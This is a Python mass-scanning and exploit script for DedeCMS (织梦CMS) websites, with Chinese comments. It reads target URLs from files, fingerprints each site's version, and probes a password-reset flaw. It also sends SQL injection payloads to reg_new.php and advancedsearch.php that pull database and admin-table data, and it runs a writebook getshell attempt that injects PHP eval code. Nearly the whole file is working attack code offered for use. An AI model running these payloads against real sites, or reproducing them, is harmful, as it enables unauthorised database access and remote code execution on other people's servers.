import requests, re
from termcolor import cprint

headers = {
    "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    "Content-Type":"application/x-www-form-urlencoded",
    "Accept-Encoding": "gzip, deflate"
}
"""
织梦CMS版本校验
"""
def getversion():
    ver_histroy = {
        '20080307': 'v3 or v4 or v5',
        '20080324': 'v5 above',
        '20080807': '5.1 or 5.2',
        '20081009': 'v5.1sp',
        '20081218': '5.1sp',
        '20090810': '5.5',
        '20090912': '5.5',
        '20100803': '5.6',
        '20101021': '5.3',
        '20111111': 'v5.7 or v5.6 or v5.5',
        '20111205': '5.7.18',
        '20111209': '5.6',
        '20120430': '5.7SP or 5.7 or 5.6',
        '20120621': '5.7SP1 or 5.7 or 5.6',
        '20120709': '5.6',
        '20121030': '5.7SP1 or 5.7',
        '20121107': '5.7',
        '20130608': 'V5.6-Final',
        '20130922': 'V5.7SP1',
        '20140225': 'V5.6SP1',
        '20140725': 'V5.7SP1',
        '20150618': '5.7',
        '20170405': 'V5.7SP2',
        '20180109': 'V5.7SP2'
    }
    ver_list = sorted(list(ver_histroy.keys()))#将键变成列表，并排序
    sorted_ver_list = sorted(ver_list)#重新排序
    for i in range(1,3):
        with open("../webscan/DedeCMS/url{0}.txt".format(i), "r+") as r:
            urls = r.readlines()
            for url in urls:
                url_text = url.split("\n")
                payload = "/data/admin/ver.txt"
                # if '://' not in url_text[0]:
                #     url = 'http://' + url + '/'
                url_ver = url_text[0] + payload
                ver = requests.get(url=url_ver, headers=headers)
                if ver.status_code == 200:
                    m = re.search("^(\d+)$", ver.text)
                    if m:
                        version = m.group(1)
                        version_index = ver_histroy[ver_list[sorted_ver_list.index(version)]]
                        msg = "探测到dedecms版本:{} version:{}".format(ver.text, version_index)
                        return msg
"""
密码重置漏洞
"""
def passwordrest():
    for i in range(1,3):
        with open("../webscan/DedeCMS/url{0}.txt".format(i), "r+") as r:
            urls = r.readlines()
            for url in urls:
                url_text = url.split("\n")
                payload = 'member/reg_new.php'
                url_ver = url_text[0] + payload
                passwd = requests.get(url=url_ver, headers=headers)
                if "系统关闭了会员功能" in passwd.text:
                    return "系统关闭了会员功能"
                else:
                    return cprint("可能存在dede任意用户重置漏洞:{0}".format(url_ver), "red")

"""
reg_new.php SQL注入
"""
def reg_new_sqli():
    for i in range(1,3):
        with open("../webscan/DedeCMS/url{0}.txt".format(i), "r+") as r:
            urls = r.readlines()
            for url in urls:
                url_text = url.split("\n")
                payload = "member/reg_new.php?dopost=regbase&step=1&mtype=%B8%F6%C8%CB&mtype=%B8%F6%C8%CB&userid=123asd123&uname=12asd13123&userpwd=123123&userpwdok=123123&email=1213asd123%40QQ.COM&safequestion=1','1111111111111','1389701121','127.0.0.1','1389701121','127.0.0.1'),('个人',user(),'4297f44b13955235245b2497399d7a93','12as11111111111111111d13123','','10','0','1213asd11111111111123@QQ.COM','100', '0','-10','','1&safeanswer=1111111111111&sex=&vdcode=slum&agree="
                vulnurl = url_text[0] + payload
                r = requests.get(url=vulnurl, headers=headers)
                html = r.text
                if '1213asd11111111111123@QQ.COM' in html:
                    cprint("target may be reg_new.php SqlInject：{0}".format(vulnurl), "red")

def advancedsearch_sqli():
    for i in range(1,3):
        with open("../webscan/DedeCMS/url{0}.txt".format(i), "r+") as r:
            urls = r.readlines()
            for url in urls:
                url_text = url.split("\n")
                payload = "/plus/advancedsearch.php?mid=1&sql=SELECT%20*%20FROM%20`%23@__admin"
                vulnurl = url_text[0] + payload
                r = requests.get(url=vulnurl, headers=headers)
                html = r.text
                if r.status_code == 200 and r"admin" in html:
                    cprint("target may be advancedsearch.php SqlInject:" + vulnurl, "red")

def writebook_getshell():
    for i in range(1,3):
        with open("../webscan/DedeCMS/url{0}.txt".format(i), "r+") as r:
            urls = r.readlines()
            for url in urls:
                url_text = url.split("\n")
                payload = "/member/story_add_content_action.php?body=eval(phpinfo(););&chapterid=1"
                vulnurl = url_text[0] + payload
                r = requests.get(url=vulnurl, headers=headers)
                m = requests.get(url=url_text[0] + 'data/textdata/1/bk1.php', headers=headers)
                html = r.content
                print(html)
                # if m.status_code == 200 and "phpinfo" in html:
                #     cprint("target may be hava writebook.php getshell:" + vulnurl, "red")
writebook_getshell()